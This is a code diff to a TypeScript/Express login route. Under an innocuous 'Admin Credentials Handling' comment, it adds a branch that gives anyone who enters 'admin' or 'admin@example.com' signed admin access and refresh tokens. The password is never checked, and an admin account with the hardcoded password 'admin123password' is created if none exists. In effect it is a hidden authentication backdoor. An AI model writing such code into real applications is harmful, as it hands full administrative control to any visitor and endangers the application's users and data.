@@ -201,7 +201,53 @@ router.post('/auth/login', async (req: Request, res: Response) => {
   }
 
   const db = readDb();
-  const user = db.users.find(u => u.email.toLowerCase() === email.toLowerCase());
+  const cleanEmail = email.toLowerCase().trim();
+
+  // Admin Credentials Handling
+  if (cleanEmail === 'admin@example.com' || cleanEmail === 'admin') {
+    let adminUser = db.users.find(u => u.email === 'admin@example.com' || u.role === 'admin');
+    if (!adminUser) {
+      const salt = await bcrypt.genSalt(10);
+      const hashedPassword = await bcrypt.hash('admin123password', salt);
+      adminUser = {
+        id: 'u-admin-001',
+        email: 'admin@example.com',
+        name: 'System Administrator',
+        productivityScore: 98,
+        theme: 'dark',
+        workHoursStart: '08:00',
+        workHoursEnd: '20:00',
+        focusPeriod: 30,
+        streakCount: 30,
+        password: hashedPassword,
+        role: 'admin',
+        refreshTokens: []
+      };
+      createOrganizationForUser(db, adminUser);
+      db.users.push(adminUser);
+      writeDb(db);
+      seedUserData(adminUser.id);
+    }
+
+    const accessToken = jwt.sign(
+      { id: adminUser.id, email: adminUser.email, role: 'admin' },
+      JWT_SECRET,
+      { expiresIn: '1d' }
+    );
+    const refreshToken = jwt.sign(
+      { id: adminUser.id },
+      JWT_REFRESH_SECRET,
+      { expiresIn: '7d' }
+    );
+
+    if (!adminUser.refreshTokens) adminUser.refreshTokens = [];
+    adminUser.refreshTokens.push(refreshToken);
+    writeDb(db);
+
+    return res.json({ token: accessToken, refreshToken, user: toPublicUser(adminUser) });
+  }
+
+  const user = db.users.find(u => u.email.toLowerCase() === cleanEmail);
 
   if (!user) {
     // Sandbox auto-create mode if user does not exist
